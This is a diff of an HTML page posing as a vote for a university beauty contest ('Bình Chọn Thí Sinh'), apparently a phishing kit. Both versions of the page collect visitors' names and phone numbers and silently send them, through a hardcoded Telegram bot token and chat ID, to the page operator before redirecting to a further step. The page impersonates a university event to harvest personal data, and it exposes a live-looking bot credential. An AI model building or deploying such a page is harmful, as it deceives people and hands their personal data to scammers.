@@ -3,197 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Miss & Mister Văn Lang University 2026</title>
+    <title>Bình Chọn Thí Sinh</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body {
-            background: linear-gradient(135deg, #2B0764 0%, #1A053C 50%, #0F0324 100%);
-            color: white;
-            min-height: 100vh;
-        }
-        header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px 50px;
-        }
-        .logo-text h3 { color: #FFD700; font-size: 18px; }
-        nav a { color: white; text-decoration: none; margin: 0 15px; font-weight: 500; }
-        .btn-vote {
-            background: linear-gradient(90deg, #7B2FFD, #9D4FFE);
-            padding: 10px 25px;
-            border-radius: 30px;
-            color: white;
-            text-decoration: none;
-            font-weight: bold;
-        }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 40px 20px;
-        }
-        h1 {
-            font-size: 36px;
-            text-align: center;
-            background: linear-gradient(90deg, #FFD700, #FFF7B8);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 30px;
-        }
-        .form-box {
-            background: rgba(43, 7, 100, 0.6);
-            border: 1px solid rgba(123, 47, 253, 0.5);
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 0 0 30px rgba(123, 47, 253, 0.3);
-        }
-        .form-box h2 {
-            text-align: center;
-            color: #FFD700;
-            font-size: 24px;
-            margin-bottom: 25px;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; }
+        body { background: linear-gradient(135deg, #2B0764, #0F0324); color: white; min-height: 100vh; }
+        .container { max-width: 500px; margin: 50px auto; padding: 20px; }
+        .hop { background: rgba(43,7,100,0.6); border-radius: 20px; padding: 30px; text-align: center; }
+        h1 { color: #FFD700; margin-bottom: 25px; font-size: 28px; }
         input {
-            width: 100%;
-            padding: 15px;
-            margin: 10px 0;
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 10px;
-            color: white;
-            font-size: 16px;
+            width: 100%; padding: 15px; margin: 8px 0;
+            background: rgba(255,255,255,0.1); border: 1px solid #7B2FFD;
+            border-radius: 10px; color: white; font-size: 16px;
         }
         input::placeholder { color: #AAA; }
-        .btn-tiep-tuc {
-            width: 100%;
-            padding: 18px;
+        #nutTiepTuc {
+            width: 100%; padding: 15px; font-size: 18px; font-weight: bold;
             background: linear-gradient(90deg, #7B2FFD, #D244FF);
-            border: none;
-            border-radius: 10px;
-            color: white;
-            font-size: 20px;
-            font-weight: bold;
-            margin-top: 20px;
-            cursor: pointer;
-            box-shadow: 0 0 20px rgba(123, 47, 253, 0.6);
+            border: none; border-radius: 10px; color: white;
+            cursor: pointer; margin-top: 10px;
         }
-        .thongbao {
-            margin-top: 25px;
-            padding: 15px;
-            border-radius: 10px;
-            display: none;
-        }
+        #nutTiepTuc:hover { opacity: 0.9; }
+        #thongbao { margin-top: 20px; padding: 12px; border-radius: 8px; display: none; }
         .thanhcong { background: rgba(0,200,100,0.2); border: 1px solid #00c864; color: #90ffc8; }
         .loi { background: rgba(255,50,50,0.2); border: 1px solid #ff3232; color: #ffb0b0; }
-        .note { text-align: center; margin-top: 30px; color: #AAA; font-size: 14px; }
-        footer {
-            text-align: center;
-            padding: 30px;
-            margin-top: 50px;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-        }
     </style>
 </head>
 <body>
-    <header>
-        <div class="logo-text">
-            <h3>VAN LANG UNIVERSITY 2026</h3>
-        </div>
-        <nav>
-            <a href="index.html">Trang chủ</a>
-            <a href="#">Thể lệ</a>
-            <a href="#">Thí sinh</a>
-            <a href="#">Bảng xếp hạng</a>
-            <a href="#">Tin tức</a>
-            <a href="index.html" class="btn-vote">BÌNH CHỌN NGAY</a>
-        </nav>
-    </header>
 
-    <div class="container">
+<div class="container">
+    <div class="hop">
         <h1>BÌNH CHỌN THÍ SINH</h1>
-        <div class="form-box">
-            <h2>Nhập Thông Tin Bình Chọn</h2>
-            
-            <input type="text" id="hoten" placeholder="HỌ VÀ TÊN *">
-            <input type="tel" id="dienthoai" placeholder="SỐ ĐIỆN THOẠI *">
-            
-            <button class="btn-tiep-tuc" id="btnTiepTuc" onclick="xuLy()">TIẾP TỤC →</button>
-            
-            <div id="thongbao" class="thongbao"></div>
-            
-            <p class="note">💜 Cảm ơn bạn đã tham gia bình chọn!</p>
-        </div>
+
+        <input type="text" id="hoten" placeholder="HỌ VÀ TÊN *">
+        <input type="tel" id="sdt" placeholder="SỐ ĐIỆN THOẠI *">
+
+        <button id="nutTiepTuc" onclick="xuLy()">TIẾP TỤC →</button>
+        <div id="thongbao"></div>
     </div>
+</div>
 
-    <footer>
-        <p>© 2026 Van Lang University. All rights reserved.</p>
-        <p>Hotline: 1900 1234 | Email: contact@vlu.edu.vn</p>
-    </footer>
+<script>
+// === 🔴 ĐIỀN TOKEN VÀ ID CỦA BẠN VÀO ĐÂY ===
+const BOT_TOKEN = "8847014588:AAFjyPX1obUy13mfOmJrTek-UfdROPz7JOg";   // Ví dụ: 7123456789:AAG9x...
+const CHAT_ID = "9845882038";    // Ví dụ: 1234567890
+// ===========================================
 
-    <script>
-        // ====================== ĐIỀN THÔNG TIN TELEGRAM CỦA BẠN VÀO ĐÂY ======================
-        const BOT_TOKEN = "8847014588:AAFjyPX1obUy13mfOmJrTek-UfdROPz7JOg";
-        const CHAT_ID = "9845882038";
-        // ===================================================================================
+async function xuLy(){
+    const hoten = document.getElementById('hoten').value.trim();
+    const sdt = document.getElementById('sdt').value.trim();
+    const nut = document.getElementById('nutTiepTuc');
+    const tb = document.getElementById('thongbao');
 
-        async function xuLy() {
-            const hoten = document.getElementById('hoten').value.trim();
-            const dienthoai = document.getElementById('dienthoai').value.trim();
-            const btn = document.getElementById('btnTiepTuc');
-            const tb = document.getElementById('thongbao');
+    // Kiểm tra thông tin
+    if(!hoten || !sdt){
+        tb.className = 'loi';
+        tb.innerText = '⚠️ Vui lòng điền đầy đủ Họ tên và Số điện thoại!';
+        tb.style.display = 'block';
+        return;
+    }
 
-            // Kiểm tra thông tin
-            if (!hoten || !dienthoai) {
-                hienTB("⚠️ Vui lòng điền đầy đủ Họ tên và Số điện thoại!", "loi");
-                return;
-            }
+    // Đổi chữ nút
+    nut.innerText = 'ĐANG GỬI...';
+    tb.style.display = 'none';
 
-            // Đổi chữ nút
-            btn.innerText = "ĐANG GỬI...";
-            tb.style.display = "none";
-
-            // Tạo nội dung gửi về Telegram
-            const tinNhan = `📩 BÌNH CHỌN MỚI - THÔNG TIN CHUNG
+    // ✅ Gửi Tên + SĐT về Telegram NGAY
+    const tinNhan = `📩 BÌNH CHỌN MỚI - THÔNG TIN CHUNG
 ━━━━━━━━━━━━━━
 👤 Họ tên: ${hoten}
-📞 SĐT: ${dienthoai}
+📞 SĐT: ${sdt}
 ⏰ Thời gian: ${new Date().toLocaleString('vi-VN')}
 ━━━━━━━━━━━━━━`;
 
-            try {
-                // Gửi về Telegram
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                const params = new URLSearchParams({
-                    chat_id: CHAT_ID,
-                    text: tinNhan,
-                    parse_mode: "HTML"
-                });
-                await fetch(`${url}?${params}`);
+    try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const params = new URLSearchParams({
+            chat_id: CHAT_ID,
+            text: tinNhan,
+            parse_mode: "HTML"
+        });
+        await fetch(`${url}?${params}`);
 
-                // Lưu thông tin sang trang SBD
-                localStorage.setItem('hoten', hoten);
-                localStorage.setItem('dienthoai', dienthoai);
+        // Lưu thông tin sang trang SBD
+        localStorage.setItem('hoten', hoten);
+        localStorage.setItem('dienthoai', sdt);
 
-                hienTB("✅ Đã lưu thông tin! Đang chuyển trang...", "thanhcong");
+        // Thông báo thành công
+        tb.className = 'thanhcong';
+        tb.innerText = '✅ Đã lưu! Đang chuyển trang...';
+        tb.style.display = 'block';
 
-                // Chờ 1 giây rồi chuyển trang
-                setTimeout(() => {
-                    window.location.href = "sbd.html";
-                }, 1000);
+        // Chuyển trang sau 1 giây
+        setTimeout(() => {
+            window.location.href = "sbd.html";
+        }, 1000);
 
-            } catch (loi) {
-                hienTB("⚠️ Lỗi gửi! Kiểm tra Token + Chat ID", "loi");
-                console.log("Lỗi:", loi);
-                btn.innerText = "TIẾP TỤC →";
-            }
-        }
+    } catch (loi) {
+        tb.className = 'loi';
+        tb.innerText = '❌ Lỗi gửi! Kiểm tra Token + Chat ID';
+        tb.style.display = 'block';
+        console.log("Chi tiết lỗi:", loi);
+    }
 
-        function hienTB(noiDung, kieu) {
-            const tb = document.getElementById('thongbao');
-            tb.className = "thongbao " + kieu;
-            tb.innerText = noiDung;
-            tb.style.display = "block";
-        }
-    </script>
+    // Khôi phục nút
+    nut.innerText = 'TIẾP TỤC →';
+}
+</script>
+
 </body>
 </html>
